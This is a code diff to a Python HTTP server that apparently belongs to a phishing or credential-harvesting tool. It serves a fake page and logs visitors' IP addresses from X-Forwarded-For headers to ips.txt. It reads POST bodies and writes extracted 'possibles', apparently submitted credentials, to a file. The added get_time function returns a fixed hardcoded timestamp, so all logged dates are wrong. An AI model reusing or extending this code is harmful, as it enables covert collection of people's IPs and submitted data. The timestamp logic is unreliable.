@@ -4,6 +4,7 @@ from io import BytesIO
 import urllib.request
 import logging
 import re
+from datetime import datetime
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     
@@ -17,7 +18,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             print('.::Listening on port 8000...\n')
             httpd.serve_forever()
 
-    def do_GET(self):   #Request via GET
+    def do_GET(self):
         self.send_response(200)
         self.end_headers()
         file = open('site/index.html','r')
@@ -25,10 +26,13 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         for lines in readfile:
             self.wfile.write(lines.encode())
         self.get_ip()
-        print(Fore.RED+'[+]IP Found:',self.ips[-1])
-        print(Style.RESET_ALL)
+        try:
+            print(Fore.RED+'[+]IP Found:',self.ips[-1])
+            print(Style.RESET_ALL)
+        except IndexError:
+            pass
 
-    def do_POST(self):  #Request via POST
+    def do_POST(self):
         content_length = int(self.headers['Content-Length'])
         body = self.rfile.read(content_length)
         self.send_response(200)
@@ -43,7 +47,16 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         for lines in log:
             if re.search('^'+'X-Forwarded-For',lines):
                 address = lines.split('X-Forwarded-For: ')
-                self.ips.append(address[1])
+                if not address[1] in self.ips:
+                    date = self.get_time()
+                    self.ips.append(address[1])
+                    file = open('ips.txt','a+')
+                    file.write('Date: '+str(date)+' IP: '+str(address[1])+'\n')
+
+    def get_time(self):
+        timestamp = 1545730073
+        timenow = datetime.fromtimestamp(timestamp)
+        return timenow
 
     def log_message(self, format, *args):
         logging.error(self.headers)
@@ -66,7 +79,8 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                         print('[+].::',possibles)
                         print("=" * 52 + "\n")
                         print(Style.RESET_ALL)
-                        file.write('IP: '+self.ips[-1]+'\n'+'    '.join(possibles)+'\n')
+                        date = self.get_time()
+                        file.write(str(date)+' '+str(possibles)+'\n')
                         count = 0
                         possibles = []
         file.close()
